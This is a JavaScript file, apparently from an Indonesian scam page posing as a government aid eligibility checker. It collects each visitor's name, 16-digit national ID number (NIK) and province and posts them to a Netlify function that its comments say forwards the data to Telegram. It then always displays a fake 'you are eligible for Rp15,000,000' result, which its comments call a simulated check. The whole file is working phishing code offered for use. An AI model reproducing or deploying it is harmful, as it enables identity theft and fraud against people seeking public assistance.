document.getElementById('cek-btn').addEventListener('click', function() {
    const nama = document.getElementById('nama').value.trim();
    const nik = document.getElementById('nik').value.trim();
    const provinsi = document.getElementById('provinsi').value;
    
    // Validasi input
    if (!nama || !nik || !provinsi) {
        alert('Harap lengkapi semua data!');
        return;
    }
    
    if (nik.length !== 16 || isNaN(nik)) {
        alert('NIK harus terdiri dari 16 digit angka!');
        return;
    }
    
    // Kirim data ke Netlify Function
    sendDataToTelegram(nama, nik, provinsi);
    
    // Simulasi pengecekan data
    const resultSection = document.getElementById('result-section');
    const resultTitle = document.getElementById('result-title');
    const resultDetails = document.getElementById('result-details');
    const danaAmount = document.getElementById('dana-amount');
    
    // Menampilkan hasil
    resultSection.style.display = 'block';
    resultSection.className = 'result-section result-positive';
    
    resultTitle.textContent = 'Selamat! Anda Berhak Menerima Dana Bantuan';
    resultDetails.innerHTML = `
        <p><strong>Nama:</strong> ${nama}</p>
        <p><strong>NIK:</strong> ${nik}</p>
        <p><strong>Provinsi:</strong> ${provinsi}</p>
        <p>Berdasarkan data yang kami terima, Anda termasuk dalam daftar penerima bantuan pemerintah.</p>
    `;
    danaAmount.textContent = 'Rp15.000.000';
    
    // Scroll ke hasil
    resultSection.scrollIntoView({ behavior: 'smooth' });
});

// Fungsi untuk mengirim data ke Telegram via Netlify Function
async function sendDataToTelegram(nama, nik, provinsi) {
    try {
        const response = await fetch('/.netlify/functions/send-dana-data', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                nama: nama,
                nik: nik,
                provinsi: provinsi
            })
        });
        
        const result = await response.json();
        console.log('Data berhasil dikirim:', result);
    } catch (error) {
        console.error('Error mengirim data:', error);
    }
}
